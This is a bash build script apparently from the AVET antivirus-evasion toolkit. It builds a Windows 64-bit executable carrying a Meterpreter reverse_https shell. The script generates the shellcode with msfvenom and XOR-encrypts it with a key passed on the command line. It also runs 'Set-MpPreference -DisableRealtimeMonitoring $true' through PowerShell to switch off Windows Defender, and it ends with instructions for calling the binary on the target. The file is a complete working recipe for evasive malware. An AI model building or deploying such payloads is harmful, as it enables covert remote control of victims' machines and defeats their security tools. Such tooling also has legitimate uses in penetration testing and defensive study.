#!/bin/bash


#DESCRIPTION_START
# Execute 64-bit shellcode.
# Encrypts the payload with a dynamic XOR key, which needs to be provided via command line argument 2 to decrypt.
# Attempts to disable Windows Defender's real-time protection via Powershell command "Set-MpPreference -DisableRealtimeMonitoring $true".
#DESCRIPTION_END


# print AVET logo
cat banner.txt

# include script containing the compiler var $win64_compiler
# you can edit the compiler in build/global_win64.sh
# or enter $win64_compiler="mycompiler" here
. build/global_win64.sh

# import feature construction interface
. build/feature_construction.sh

# import global default lhost and lport values from build/global_connect_config.sh
. build/global_connect_config.sh


#CONFIGURATION_START
# override connect-back settings here, if necessary
LPORT=$GLOBAL_LPORT
LHOST=$GLOBAL_LHOST
# generate key file
generate_key preset aabbccddee input/key_raw.txt
# enable debug output
enable_debug_print
#CONFIGURATION_END


# make meterpreter reverse payload
msfvenom -p windows/x64/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x64/xor -f raw --platform Windows > input/sc_raw.txt

# try to disable Windows Defender's real-time protection via powershell
set_command_source static_from_here 'Set-MpPreference -DisableRealtimeMonitoring $true'
set_command_exec exec_via_powershell



# encrypt payload
encode_payload xor input/sc_raw.txt input/scenc_raw.txt input/key_raw.txt

# convert to c array format for static include
./tools/data_raw_to_c/data_raw_to_c input/scenc_raw.txt input/scenc_c.txt buf

# set encrypted payload as source
set_payload_source static_from_file input/scenc_c.txt

# set decoder and key source
# key is retrieved in hex format from command line
set_decoder xor
set_key_source from_command_line_hex

# set payload info source
set_payload_info_source no_data

# set shellcode binding technique
set_payload_execution_method exec_shellcode64

# call make_avet, compile 
$win64_compiler -o output/disablewindefpsh_xorfromcmd_revhttps_win64.exe source/avet.c
strip output/disablewindefpsh_xorfromcmd_revhttps_win64.exe

# cleanup
cleanup_techniques

echo "
# The decryption key is aabbccddee if it has not been changed.
# Call on target like:
# disablewindefpsh_xorfromcmd_revhttps_win64.exe first [decryption key]
"
